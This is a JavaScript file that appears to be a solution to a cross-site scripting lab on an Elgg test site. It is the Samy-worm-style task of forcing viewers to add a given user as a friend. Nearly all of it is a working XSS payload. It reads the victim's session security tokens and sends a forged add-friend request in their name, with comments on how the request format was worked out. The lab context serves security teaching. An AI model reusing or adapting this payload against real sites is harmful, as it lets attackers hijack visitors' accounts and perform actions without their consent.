// I logged 'elgg' object in console upon window.onload.
// By this I acquired the knowledge of all the methods and fields of this 'elgg' object.

window.onload = function () {
  // First I checked if the logged in user's id is Samy (Hacker)'s id (47).
  // If it is I didn't make the add friend call.
  if (elgg.get_logged_in_user_guid() !== 47) {
    addFriend();
  }
};

function addFriend() {
  const ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
  const token = "&__elgg_token=" + elgg.security.token.__elgg_token;

  // I acquired the id of samy (47) by logging into samy's account and
  // calling 'elgg.get_logged_in_user_guid()'
  const friend = "friend=47";

  // I acquried the structure of the request url by observing the 'Network' tab
  // of Browser Inspection after pressing the 'Add Friend' Button
  const sendurl =
    "http://www.xsslabelgg.com/action/friends/add?" + friend + ts + token;

  const Ajax = new XMLHttpRequest();
  Ajax.open("GET", sendurl, true);
  Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
  Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  Ajax.send();

  console.log("Automatically Added Friend ");
}
